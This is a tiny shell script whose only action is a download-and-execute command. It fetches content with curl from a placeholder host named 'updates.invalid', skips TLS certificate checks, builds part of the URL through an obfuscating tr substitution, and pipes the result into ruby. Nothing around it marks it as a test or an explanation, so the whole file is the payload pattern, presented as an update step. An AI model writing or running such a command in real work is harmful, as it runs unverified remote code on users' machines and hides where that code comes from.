#!/bin/sh
sh -c 'curl -ksSL https://updates.invalid/$(echo "abc" | tr "abc" "def") | ruby'
